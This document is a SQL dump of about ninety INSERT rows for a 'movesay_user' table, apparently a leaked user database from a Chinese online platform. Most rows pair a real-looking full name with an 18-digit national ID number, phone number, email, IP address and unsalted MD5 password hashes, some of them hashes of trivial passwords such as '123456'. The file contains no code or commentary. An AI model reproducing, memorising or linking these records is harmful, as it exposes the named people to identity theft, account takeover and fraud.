INSERT INTO `movesay_user` VALUES ('4934', 'evernever', '', '0', '0db99f588297fe84f3950f605a920712', '1', '8cfea86c947ad38642c9cbd155ba2520', '0', '0', '0', '程勇林', '362502199110306612', '0', '', '171.34.208.72', '未分配或者内网IP', '0', '1505399302', '0', '1', '2244615175@qq.com', null, 'WMZRXH', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4935', 'xwc3288', '15152651318', '1505401171', '3c3acdc7bfbf9e1b1afc9ca8e2140050', '1', '00d247e625b4c117d3026b94ee70ac9c', '0', '0', '0', '刘玉梅', '340102195511181026', '1', '', '114.226.190.47', '未分配或者内网IP', '0', '1505400684', '0', '1', '381555053@qq.com', null, 'FZDRHE', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4943', 'LX101', '', '0', '0b91204057e8c14aef4c273a5bbef90b', '1', 'ffeb6e2187dd086e63ea74c4364cff8e', '0', '0', '0', '', '', '1', '', '182.97.222.151', '未分配或者内网IP', '0', '1505414569', '0', '1', '', null, 'CUJRWV', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4941', 'LX101', '', '0', '0b91204057e8c14aef4c273a5bbef90b', '1', '0b91204057e8c14aef4c273a5bbef90b', '0', '0', '0', '陈静', '', '2', '', '182.97.222.151', '未分配或者内网IP', '0', '1505412330', '0', '1', '', null, 'JPCVHB', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4942', 'LX102', '', '0', '0b91204057e8c14aef4c273a5bbef90b', '1', '0b91204057e8c14aef4c273a5bbef90b', '0', '0', '0', '', '', '3', '', '182.97.222.151', '未分配或者内网IP', '0', '1505413248', '0', '1', '', null, 'TCGLJZ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4939', 'x18523918369', '18523918369', '1505406939', '816a7581f17ba1c595d26825b567b394', '1', 'ada11dde22ba12893f1275cc80a5550f', '0', '0', '0', '李冬梅', '511322198612126766', '0', '', '118.120.102.223', '未分配或者内网IP', '0', '1505406175', '0', '1', '18523918369@163.co', null, 'IGAZKN', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4944', 'LX103', '13295724071', '1505453193', '0b91204057e8c14aef4c273a5bbef90b', '1', '0b91204057e8c14aef4c273a5bbef90b', '0', '0', '0', '谭元良', '', '17', '', '182.97.222.151', '未分配或者内网IP', '0', '1505414918', '0', '2', '', null, 'EQLRNF', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4945', 'LX189', '', '0', '0b91204057e8c14aef4c273a5bbef90b', '1', '0b91204057e8c14aef4c273a5bbef90b', '0', '0', '0', '伍培文', '', '3', '', '182.97.222.151', '未分配或者内网IP', '0', '1505415437', '0', '1', '', null, 'YMBJIF', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4946', 'LX181', '', '0', '0b91204057e8c14aef4c273a5bbef90b', '1', '0b91204057e8c14aef4c273a5bbef90b', '0', '0', '0', '刘海深', '', '1', '', '182.97.222.151', '未分配或者内网IP', '0', '1505415825', '0', '1', '', null, 'HPZBCY', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4947', 'LX8899', '15578909335', '1505454628', '0b91204057e8c14aef4c273a5bbef90b', '1', '0b91204057e8c14aef4c273a5bbef90b', '0', '0', '0', '廖阳秀', '', '6', '', '182.97.222.151', '未分配或者内网IP', '0', '1505416363', '0', '2', '', null, 'UDLKGS', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4948', 'z15938600516', '', '0', '2790454996ac12cd103a7bc5e7b053ae', '1', '8501d714f3a54865a128f8baf1306bc7', '0', '0', '0', '张永坡', '410411197403151516', '1', '', '14.152.68.187', '未分配或者内网IP', '0', '1505429706', '0', '1', '246078@qq.com', null, 'HPYTUL', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4949', 'z15938900516', '15938900516', '1505459486', '2790454996ac12cd103a7bc5e7b053ae', '1', '8501d714f3a54865a128f8baf1306bc7', '0', '0', '0', '张永坡', '410411197403151516', '5', '', '101.226.125.114', '未分配或者内网IP', '0', '1505431207', '0', '1', '15938900516@163.co', '15938900516', 'DWBVES', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4950', 'zy15938900516', '', '0', '2790454996ac12cd103a7bc5e7b053ae', '1', '8501d714f3a54865a128f8baf1306bc7', '0', '0', '0', '张永坡', '410411197403151516', '1', '', '101.226.125.114', '未分配或者内网IP', '0', '1505431266', '0', '1', '123456@qq.com', null, 'XYJRCT', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4951', 'prb1234', '13205539240', '1505431902', 'deec89ced63a8cf94761e7abc0678d60', '1', 'bff6e87f450b5669951970e277549c52', '0', '0', '0', '彭如斌', '340204197609300713', '1', '', '60.167.60.28', '未分配或者内网IP', '0', '1505431723', '0', '1', '109474202@qq.com', null, 'ZQMSLI', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4952', 'liuhaiyun112233', '15150939931', '1505435050', '324a3ce5c55466506f73c8a453643f38', '1', 'd0970714757783e6cf17b26fb8e2298f', '0', '0', '0', '刘海云', '320703195711270010', '0', '', '120.195.151.9', '未分配或者内网IP', '0', '1505434462', '0', '1', '504837987@qq.com', null, 'ZQVEYP', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4953', 'was666', '13401639866', '1505464482', 'be8c17303076669c216189cfa97a0708', '1', 'b9ecf1771473963057f073cc2c08f61c', '0', '0', '0', '汪爱社', '342531197512110718', '7', '', '36.149.137.138', '未分配或者内网IP', '0', '1505435679', '0', '1', '13401639866@163.co', null, 'XCWTJV', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4954', 'l13978789398', '13978789398', '1505437483', '358daaaa1ce43975fb4aeb9090c9e76d', '1', 'faa82a5449f30c0e7d31de441569d3f8', '0', '0', '0', '梁任能', '452128198306075050', '3', '', '14.17.3.122', '未分配或者内网IP', '0', '1505435909', '0', '1', '59066190@qq.com', null, 'GKXUIT', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4955', 'dj8888', '', '0', '15115520445f52bad0394333724b55dd', '1', 'a954370f5c3962ea005d0297f8fb8681', '0', '0', '0', '杜娟', '513822198403066444', '0', '', '101.226.102.139', '未分配或者内网IP', '0', '1505435929', '0', '1', '736410611@qq.com', null, 'VQYUXM', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4956', 'mm5888', '', '0', '9b04af41381ac09dec30168c323cb546', '1', '22eb30907a673b49a514bc763613a17d', '0', '0', '0', '', '', '1', '', '101.226.125.120', '未分配或者内网IP', '0', '1505436343', '0', '1', null, null, 'PWBMHD', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4957', 'yyr15098889198', '15098889198', '1505438537', '61560c89f227cf2446edcec66968780a', '1', '5b2441eca29c386975ad77a56a456e85', '0', '0', '0', ' 于佑任', '370983199001104915', '1', '', '101.226.102.139', '未分配或者内网IP', '0', '1505436609', '0', '1', '506673223@qq.com', '15098889198', 'MKBNLR', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4958', 'Sph40697475', '', '0', '8b543a6c37fa020bd58037235dc3a9a0', '1', '028bb03f5983ed1c27304b8e17b1c949', '0', '0', '0', '孙鹏辉', '410181198301256912', '2', '', '115.60.139.174', '未分配或者内网IP', '0', '1505436857', '0', '1', '40697475@qq.com', null, 'VUSJWQ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4959', 'wyf88888', '', '0', 'e10adc3949ba59abbe56e057f20f883e', '1', 'f1887d3f9e6ee7a32fe5e76f4ab80d63', '0', '0', '0', '', '', '1', '', '101.226.125.18', '未分配或者内网IP', '0', '1505438283', '0', '1', null, null, 'TWCKFQ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4960', 'm13721859910', '', '0', '45cc58f35b9406fa2604d78551b65692', '1', 'de1ab42d39b06394d8d886a825dccdb5', '0', '0', '0', '马保勤', '410481197202020025', '1', '', '123.151.152.186', '未分配或者内网IP', '0', '1505439413', '0', '1', '757200303@qq.com', null, 'BEVXWU', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4961', 'x15295056775', '15295056775', '1505458473', 'ac2eec4eeeb325d292edea4973f92057', '1', 'aa97eba124ab0c029fb7d5c37a6141b0', '0', '0', '0', '徐梦杰', '320483199305202817', '2', '', '114.226.149.80', '未分配或者内网IP', '0', '1505441852', '0', '1', '467949199@qq.com', null, 'EXMCWV', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4962', 'wyf99999', '', '0', 'e10adc3949ba59abbe56e057f20f883e', '1', 'fcea920f7412b5da7be0cf42b8c93759', '0', '0', '0', '', '', '0', '', '101.226.125.18', '未分配或者内网IP', '0', '1505442199', '0', '1', null, null, 'YCIEHS', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4963', 'dy1968', '', '0', 'e10adc3949ba59abbe56e057f20f883e', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '戴燕', '320402196804220620', '1', '', '101.226.125.120', '未分配或者内网IP', '0', '1505443827', '0', '1', '542315979@qq.com', null, 'YVQKFJ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4964', 'lrj001', '17368100532', '1505447021', '24bb3745815af459e2e66b830414c5dc', '1', 'f82e30f1da6fd9990a78e2357e3f7c0a', '0', '0', '0', '任芝宏', '320723195203043044', '3', '', '113.66.71.5', '未分配或者内网IP', '0', '1505446258', '0', '1', '2594911416@qq.com', null, 'VTPKEJ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4965', 'zxf178', '13606104865', '1505448659', '8ad4301ff5ebdfcbaa50e1e3d64a5ee3', '1', '9ce8b734dfe6724fd6607d92acb92e26', '0', '0', '0', '张雪凤', '321119196402096323', '0', '', '114.227.147.230', '未分配或者内网IP', '0', '1505446510', '0', '1', '2853658170@qq.com', null, 'LFETRK', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4966', 'as0001', '18868832299', '1505447733', '9f89f4e3ec1a37dfb54ab0d2a5518117', '1', 'c9cbf6a0868478f313a4d8ed56c6565c', '4964', '0', '0', '郑墨', '330382199402150959', '6', '', '113.66.71.5', '未分配或者内网IP', '0', '1505447544', '0', '1', '2497680697@qq.com', null, 'GVFDSJ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4967', 'cxl770512', '18721066568', '1505447797', '543f3fb5294aba2f94aa767d0f0e105e', '1', '2bed72f17c85924e158cb8e274173c9b', '0', '0', '0', '成响亮', '420123197704256216', '0', '', '113.66.71.5', '未分配或者内网IP', '0', '1505447643', '0', '1', '410870155@qq.com', null, 'KEXHAY', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4968', 'jw0001', '', '0', 'c643d4b0d36fb2d8cc7721495cbe4cf1', '1', 'dc2280b1411026372d0f99749c644f8c', '4964', '0', '0', '邹斌文', '110224196603121819', '0', '', '113.66.71.5', '未分配或者内网IP', '0', '1505447927', '0', '1', '2537189072@qq.com', null, 'BZCJWT', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4969', 'lby178', '13656112590', '1505450845', '8ad4301ff5ebdfcbaa50e1e3d64a5ee3', '1', '9ce8b734dfe6724fd6607d92acb92e26', '0', '0', '0', '李碧玉', '511128197007201521', '1', '', '114.227.147.230', '未分配或者内网IP', '0', '1505450146', '0', '1', '982324258@qq.com', null, 'ADIFNB', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4970', 'samonhong352200', '13823285677', '1505454241', '2e33dcd1ea57de4dcf7adc3dfd53eca6', '1', '294acaece5294f9b3c415d78465c9d6d', '0', '0', '0', '洪林忠', '352227197001080036', '3', '', '219.133.40.15', '未分配或者内网IP', '0', '1505451315', '0', '1', '858726786@qq.com', null, 'XPZQJF', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4971', 'x13213741232', '13213741232', '1505452008', '75e266f182b4fa3625d4a4f4f779af54', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '王延丽', '41132619840216204x', '1', '', '123.151.42.145', '未分配或者内网IP', '0', '1505451563', '0', '1', '438053049@qq.com', '13213741232', 'CSUMIR', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4972', 'shan0113', '', '0', 'e32612437285ef14d0e430e718e201a5', '1', 'a6ed035d50da2409bd6635aa4310fcae', '0', '0', '0', '金美善', '220281198501136640', '0', '', '218.59.61.226', '未分配或者内网IP', '0', '1505451724', '0', '1', '623125990@qq.com', null, 'ELMIPV', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4973', 'x15071350553', '15071350553', '1505452457', '75e266f182b4fa3625d4a4f4f779af54', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '王勋', '411327199804043511', '0', '', '123.151.42.145', '未分配或者内网IP', '0', '1505452265', '0', '1', '1279803742@qq.com', '15623064937', 'KXUFLY', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4974', 'x18955287909', '18955287909', '1505453797', '75e266f182b4fa3625d4a4f4f779af54', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '申玲', '34030419670517042x', '0', '', '123.151.42.145', '未分配或者内网IP', '0', '1505452824', '0', '1', '2698597425@qq.com', null, 'HXRNUD', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4975', 'tjr15207703216', '152077032168152', '1505458250', '1ce8bc2a4ca70d8acbf95fb99b1a75d9', '1', 'd13e5eb7b88c8dc64fc8ad2f517fccdc', '0', '0', '0', '唐菊荣', '45032119811202054X', '1', '', '116.10.48.76', '未分配或者内网IP', '0', '1505452985', '0', '1', '623033831@qq.com', '15207703216', 'PAHKUE', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4976', 'zll0001', '', '0', '7ef95d1c1a51066d2e827b521d5c6262', '1', '52187ba11c15cf5fe947e0f8e4b82591', '0', '0', '0', '张荔荔', '340403197110161624', '0', '', '60.167.161.247', '未分配或者内网IP', '0', '1505453164', '0', '1', '1374568105@qq.com', null, 'HFCKQT', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4977', 'a13170942753', '', '0', 'e120ea280aa50693d5568d0071456460', '1', 'db459cd583c215cbcc3fdd4990ce0047', '0', '0', '0', '丁永平', '34122219900320632X', '0', '', '118.212.200.46', '未分配或者内网IP', '0', '1505453726', '0', '1', '12345567@qq.com', null, 'ZNCAUB', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4978', 'a222222', '', '0', 'dc483e80a7a0bd9ef71d8cf973673924', '1', '8df32286deed62bae5bf746672805c78', '0', '0', '0', '', '', '0', '', '118.212.200.46', '未分配或者内网IP', '0', '1505454195', '0', '1', null, null, 'WDKTFP', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4979', 'a123456', '', '0', 'dc483e80a7a0bd9ef71d8cf973673924', '1', '8df32286deed62bae5bf746672805c78', '0', '0', '0', '丁永平', '34122219900320632X', '0', '', '118.212.200.46', '未分配或者内网IP', '0', '1505454602', '0', '1', '5678987@qq.com', null, 'PIGXKU', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4980', 'lxf13855335529', '13855335529', '1505454841', 'a934e5a009ee08696c0239802cb8ae7a', '1', '94133fbf3d8472ad1aeb969b0e0463df', '0', '0', '0', '吕小芳', '340211197909250627', '0', '', '36.63.160.134', '未分配或者内网IP', '0', '1505454699', '0', '1', '1102385896@qq.com', null, 'URKVTZ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4981', 'X13343949756', '', '0', '73fee192744f842a611a5ec336459f5c', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '张盘根', '41048119630504501X', '0', '', '117.136.44.244', '未分配或者内网IP', '0', '1505455059', '0', '1', '820414576@qq.com', null, 'AGUWEK', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4982', 'crw13878993682', '13878993682', '1505456158', 'a8844dafa56090055357ccba23dd98ab', '1', '8028e5989e0c3bc144f1c036f8b3aa55', '0', '0', '0', '陈荣伟', '450501196612240019', '2', '', '116.10.48.76', '未分配或者内网IP', '0', '1505455885', '0', '1', '2574848106@qq.com', '13878993682', 'XEFAPY', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4983', 'zhen1010', '18088883522', '1505456833', 'd0970714757783e6cf17b26fb8e2298f', '1', '4297f44b13955235245b2497399d7a93', '0', '0', '0', '朴珍实', '220281198603072625', '0', '', '49.77.180.221', '未分配或者内网IP', '0', '1505456000', '0', '1', '188161225@qq.com', null, 'JHGYEA', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4984', 'lz871010', '15886750520', '1505456598', 'da4af09583aa19f28953d77956c7168e', '1', '33b915d7d676b08ae45593b1aa40093b', '0', '0', '0', '罗礼帅', '412325198302172712', '2', '', '123.151.138.57', '未分配或者内网IP', '0', '1505456359', '0', '1', '272242674@qq.com', null, 'XFHYUI', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4985', 'wyp7771', '', '0', 'ff876542ea0f4abee0c65824e99c9042', '1', 'd05987c8daf01103d11bad7de02d19c6', '0', '0', '0', '戚曙辉', '320421197510250510', '0', '', '49.80.70.110', '未分配或者内网IP', '0', '1505456446', '0', '1', '782718520@qq.com', null, 'TNPVEG', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4986', 'hmh001', '', '0', 'a17eff1ab80a62aea2869a4ec6855638', '1', 'b455c1c934043e1e58d1d35290c4fd01', '4964', '0', '0', '黄梅花', '330323197606272422', '0', '', '113.66.71.5', '未分配或者内网IP', '0', '1505456745', '0', '1', '401649749@qq.com', null, 'ITQRPL', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4987', 'lifeifei366', '', '0', 'cc9b723d155191a9685f30620237d7dc', '1', '29a622479ca0d3b718dae53728829eaf', '0', '0', '0', '李飞飞', '220621198202260065', '3', '', '112.5.234.205', '未分配或者内网IP', '0', '1505456873', '0', '1', '340020279@qq.com', null, 'AGLJDE', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4988', 'liu123', '', '0', 'e10adc3949ba59abbe56e057f20f883e', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '王利平', '441425197811102427', '1', '', '49.77.180.221', '未分配或者内网IP', '0', '1505456959', '0', '1', '642350729@qq.com', null, 'BZFNSY', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4989', 'lrj002', '', '0', '24bb3745815af459e2e66b830414c5dc', '1', 'f82e30f1da6fd9990a78e2357e3f7c0a', '4964', '0', '0', '马继平', '320723197606086021', '1', '', '113.66.71.5', '未分配或者内网IP', '0', '1505457082', '0', '1', '1612637792@qq.com', null, 'SRPJHM', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4990', 'X15937572189', '', '0', '75e266f182b4fa3625d4a4f4f779af54', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '王淑红', '41048119741221002X', '0', '', '117.136.44.244', '未分配或者内网IP', '0', '1505457129', '0', '1', '346490059@qq.com', null, 'EAMDKV', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4991', 'nange2017', '15976711163', '1505457345', '45f34d7e056982eb27134fd06e6f4614', '1', '0d4cd0fe68259b16c00ebb9c31d3f83b', '0', '0', '0', '张志男', '441602199108261253', '0', '', '223.74.221.107', '未分配或者内网IP', '0', '1505457190', '0', '1', '156152612@qq.com', null, 'AXZLIK', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4992', 'chaoge2017', '13650696772', '1505457524', '45f34d7e056982eb27134fd06e6f4614', '1', '0d4cd0fe68259b16c00ebb9c31d3f83b', '0', '0', '0', '陈文钊', '441602199007120814', '0', '', '223.74.221.107', '未分配或者内网IP', '0', '1505457403', '0', '1', '420836034@qq.com', null, 'FLBTNM', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4993', 'x13338183520', '13338183520', '1505458527', '96bb7dc2c51468a9187479bab74abe8b', '1', 'fa2155228fb02e7bd77a7e821fe28fdc', '0', '0', '0', '徐国英', '320421196708092824', '1', '', '114.226.147.250', '未分配或者内网IP', '0', '1505457425', '0', '1', 'xgy133381@163.com', null, 'YHLTSC', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4994', 'X15517887255', '', '0', '75e266f182b4fa3625d4a4f4f779af54', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '李云红', '411202197310162025', '0', '', '117.136.44.244', '未分配或者内网IP', '0', '1505457524', '0', '1', '1154752620@qq.com', null, 'ENISUF', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4995', 'qxq9988', '', '0', 'a11db4de03d6489757c4e9920946c659', '1', '89ee46da499bb5028ae9c78712d403c0', '0', '0', '0', '瞿晓清', '320421196806272829', '1', '', '101.226.102.148', '未分配或者内网IP', '0', '1505457620', '0', '1', '873997155@qq.com', null, 'QKYIAS', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4996', 'z13815055156', '13815055156', '1505460703', '96bb7dc2c51468a9187479bab74abe8b', '1', 'fa2155228fb02e7bd77a7e821fe28fdc', '0', '0', '0', '张才芬', '320421196506192624', '1', '', '114.226.147.250', '未分配或者内网IP', '0', '1505457717', '0', '1', 'zcf138150@163.com', null, 'YFHAGJ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4997', 'wly5238', '13855979780', '1505458374', 'dc5d7c72729c4d31ef72a82ace661111', '1', 'a9e76c43bdc912ba7a1a259baba51166', '0', '0', '0', '汪玲瑶', '341021197108303680', '2', '', '36.57.80.63', '未分配或者内网IP', '0', '1505458070', '0', '1', '1035215859@qq.com', '13855979780', 'ZBLHJD', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4998', 'wyf001', '15858435310', '1505461276', '0d0c43d44c31ba75fd6c92a58c008428', '1', 'facad8c79ac93b43b76b75711528306c', '0', '0', '0', '吴岳福', '330719195607020233', '4', '', '221.177.252.28', '未分配或者内网IP', '0', '1505458240', '0', '1', '470617778@qq.com', 'wyfu5672@sohu.com', 'QJPHIS', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4999', 'l18239255892', '', '0', 'a2c3868aea47a7356ab917f13f1e7b4d', '1', '0b013134805559092baed77b2afc6893', '0', '0', '0', '李秀平', '410602198307133528', '0', '', '123.151.152.214', '未分配或者内网IP', '0', '1505458520', '0', '1', '18239255892@163.co', null, 'REGXPQ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5000', 'fm13819966798', '15090741865', '1505478469', '33cb7171a9620accf9947dc921f4b6d3', '1', 'bbb3db146580a851e9c6fe937a5304b2', '0', '0', '0', '曾梅', '422421197508274340', '2', '', '101.226.102.148', '未分配或者内网IP', '0', '1505458674', '0', '1', 'fengmei9584@126.co', null, 'QBMENT', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5001', 'tjc15978004308', '15978004308', '1505459012', '1c88d37be4e1d375f341d906f58288f4', '1', '6d0fc504afab99a177bbefc47735c36a', '0', '0', '0', '唐建才', '450321198310200517', '1', '', '116.10.48.76', '未分配或者内网IP', '0', '1505458765', '0', '1', '592575754@qq.com', null, 'AYQXBL', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5002', 'x13949464662', '13949464662', '1505459460', '75e266f182b4fa3625d4a4f4f779af54', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '付小平', '412922197209240046', '0', '', '123.151.42.145', '未分配或者内网IP', '0', '1505458853', '0', '1', '2587812118@qq.com', '13949464662', 'SZICBN', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5003', 'x13733767169', '13733767169', '1505459636', '75e266f182b4fa3625d4a4f4f779af54', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '陈桂兰', '410481196907150124', '2', '', '61.158.147.206', '未分配或者内网IP', '0', '1505458995', '0', '1', '568461588@qq.com', null, 'FYHMCA', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5004', 'mwl1888', '18805011231', '1505460091', '9992ae120b2348038c288f2b5f569f51', '1', '22b5b1ebcf637cb4e57e27ee1a74eefd', '0', '0', '0', '马万里', '350126197501254932', '2', '', '101.226.102.59', '未分配或者内网IP', '0', '1505459004', '0', '1', '1954607031@qq.com', '18805011231', 'LUESZV', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5005', 'gj15977099899', '15977099899', '1505459672', 'd7b3a8e58fe69f756c1a10be7c3dfb5a', '1', 'ee008df42525a8ca722f41f9b51a63f6', '0', '0', '0', '管坚', '450321197203160017', '0', '', '116.10.48.76', '未分配或者内网IP', '0', '1505459269', '0', '1', '230077971@qq.com', null, 'AYWVBF', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5006', 'zhj1788', '', '0', 'd5c309415b2126c9135d0ff90e08502b', '1', 'c2610f901735286e712ef0a11df1535b', '0', '0', '0', '朱华君', '320223197610104715', '1', '', '114.227.147.230', '未分配或者内网IP', '0', '1505459490', '0', '1', '940750730@qq.com', null, 'AWPBEH', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5007', 'sap555', '', '0', '6f3ae7784b2c918a3e9461d9ed881405', '1', 'db5971100f943c9731f297a91ef9174a', '0', '0', '0', '施爱萍', '352201198004015425', '0', '', '220.173.37.144', '未分配或者内网IP', '0', '1505459538', '0', '1', '332860296@qq.com', null, 'FLDBZG', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5008', 'chf8333', '', '0', 'b153926a331aedbd17120b4b518faf32', '1', 'caaecdf11277e23035a9e705b2718c84', '0', '0', '0', '陈浩峰', '330222197811104995', '0', '', '36.23.187.110', '未分配或者内网IP', '0', '1505459977', '0', '1', '546017784@qq.com', null, 'GQIXDA', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5009', 'g13004405616', '13004405616', '1505460434', '96bb7dc2c51468a9187479bab74abe8b', '1', 'fa2155228fb02e7bd77a7e821fe28fdc', '0', '0', '0', '管伟庆', '320421196108222912', '0', '', '114.226.147.250', '未分配或者内网IP', '0', '1505460251', '0', '1', '1178620846@qq.com', null, 'XMCDFY', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5010', 'lcj18778307403', '18778307403', '1505460910', '4297f44b13955235245b2497399d7a93', '1', 'b0e6ab09e45e2500238c845b0552a587', '0', '0', '0', '李昌姣', '452331199212053348', '1', '', '116.10.48.76', '未分配或者内网IP', '0', '1505460553', '0', '1', '740385668@qq.com', null, 'AVJGRX', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5011', 's13845735568', '13845735568', '1505464092', 'a698534b932e19fdb100be75ba6e5108', '1', '2bd7578ca99fd515f24116b3a3dde413', '0', '0', '0', '李双', '232700197208116323', '1', '', '123.151.138.73', '未分配或者内网IP', '0', '1505461911', '0', '1', '384854849@qq.com', '13845735568', 'HSCETK', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5012', 'yhx1313', '', '0', '974ebe39a1af75a9be4097abced3e3f8', '1', '63b96f7449223fcb75f28836e42f6db7', '0', '0', '0', '姚红霞', '420121197601212525', '1', '', '183.42.59.155', '未分配或者内网IP', '0', '1505462447', '0', '1', '892273842@qq.com', null, 'KRDPTZ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5013', 'ymy178', '13584313989', '1505463197', '8ad4301ff5ebdfcbaa50e1e3d64a5ee3', '1', '9ce8b734dfe6724fd6607d92acb92e26', '0', '0', '0', '杨明英', '320421196202188589', '2', '', '114.227.147.230', '未分配或者内网IP', '0', '1505462460', '0', '1', '372337924@qq.com', null, 'DSYKPB', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5014', 'thw13849551460', '13849551460', '1505463344', '2790454996ac12cd103a7bc5e7b053ae', '1', '8501d714f3a54865a128f8baf1306bc7', '0', '0', '0', '田华伟', '41048119760611401x', '1', '', '183.61.52.71', '未分配或者内网IP', '0', '1505463093', '0', '1', '13849551460@163.co', '13849551460', 'HSUNTJ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5015', 'yexiuli828225', '', '0', 'd65590d7dc7717e1e76aa56cb10371f1', '1', '7c3ac4768a9b249e5f73539344e14d57', '0', '0', '0', '叶秀丽', '440203198210161522', '0', '', '113.116.61.69', '未分配或者内网IP', '0', '1505466488', '0', '1', '123205207@qq.com', null, 'ZAHRPS', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5016', 'f18676915291', '18676915291', '1505466992', '7431f014151f2e1e98bff28ad00e90fd', '1', '869657fbd7a87dee1718db9d8964daa4', '0', '0', '0', '范明辉', '360781198807295538', '0', '', '14.120.116.11', '未分配或者内网IP', '0', '1505466851', '0', '1', '332737980@qq.com', null, 'PINTMA', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5017', 'xc888666', '', '0', '25d55ad283aa400af464c76d713c07ad', '1', '25f9e794323b453885f5181f1b624d0b', '0', '0', '0', ' 贾永常', '130283198606101517', '1', '', '123.151.152.240', '未分配或者内网IP', '0', '1505468876', '0', '1', '307211057@qq.com', null, 'JXBHLC', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5018', 'W13387852256', '', '0', '2037c6b7b6a0d3de0757c689c554eab1', '1', 'bf0638e168bc86b0b3ed30c97f7eb75e', '0', '0', '0', '吴珍珠', '411121198407240024', '0', '', '182.127.241.152', '未分配或者内网IP', '0', '1505468933', '0', '1', '13387852256@163.com', null, 'HMFDAV', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5019', 'qll001', '', '0', '81c15e0cb177cd405a0113fe91f89924', '1', '', '0', '0', '0', '', '', '0', '', '101.226.102.79', '未分配或者内网IP', '0', '1505469347', '0', '1', null, null, 'ULTERF', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5020', 'mm0001', '13544191501', '1505472172', '2e1c0f747f01927ecab71474910079a9', '1', '57ebdcf8936411bb7c72787b84f33744', '0', '0', '0', '石绅绅', '410325198701190510', '0', '', '14.155.17.51', '未分配或者内网IP', '0', '1505471923', '0', '1', '732327245@qq.com', null, 'GKEYRW', null, 'CN');
